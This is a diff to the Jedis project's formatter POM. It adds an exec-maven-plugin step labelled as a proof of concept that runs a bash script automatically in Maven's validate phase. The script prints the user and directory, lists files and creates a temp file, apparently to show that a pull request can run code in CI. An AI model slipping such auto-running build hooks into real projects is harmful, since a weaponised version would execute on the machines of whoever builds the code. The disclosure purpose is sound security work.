@@ -10,17 +10,50 @@
 	<groupId>redis.clients</groupId>
 	<artifactId>jedis</artifactId>
 	<name>Jedis</name>
-	<version>5.3.0</version>
+	<version>5.3.0</version> <!-- Version from your original POM -->
 	<description>Jedis is a blazingly small and sane Redis java client.</description>
 	<url>https://github.com/redis/jedis</url>
 
 
 	<build>
 		<plugins>
+            <!-- PoC: Added exec-maven-plugin to demonstrate RCE -->
+            <plugin>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>3.1.1</version> <!-- Use a recent version -->
+                <executions>
+                    <execution>
+                        <id>poc-rce</id>
+                        <phase>validate</phase> <!-- Trigger during the validate phase -->
+                        <goals>
+                            <goal>exec</goal>
+                        </goals>
+                        <configuration>
+                            <executable>bash</executable>
+                            <arguments>
+                                <argument>-c</argument>
+                                <argument>
+                                  echo ">>> PoC: EXECUTING CODE FROM PR (in formatter-pom.xml) <<<";
+                                  echo ">>> PoC: Current directory: $(pwd)";
+                                  echo ">>> PoC: User: $(whoami)";
+                                  echo ">>> PoC: Listing files in current directory:";
+                                  ls -la;
+                                  echo ">>> PoC: Attempting to create a temp file (permissions permitting):";
+                                  touch /tmp/poc_jedis_formatter_ran && echo ">>> PoC: File /tmp/poc_jedis_formatter_ran created." || echo ">>> PoC: Could not create /tmp/poc_jedis_formatter_ran.";
+                                  echo ">>> PoC: Java Format Check PoC FINISHED <<<";
+                                </argument>
+                            </arguments>
+                        </configuration>
+                    </execution>
+                </executions>
+            </plugin>
+
+			<!-- Original formatter-maven-plugin -->
 			<plugin>
 				<groupId>net.revelc.code.formatter</groupId>
 				<artifactId>formatter-maven-plugin</artifactId>
-				<version>2.23.0</version>
+				<version>2.23.0</version> <!-- Version from your original POM -->
 				<configuration>
 					<configFile>${project.basedir}/hbase-formatter.xml</configFile>
 				</configuration>
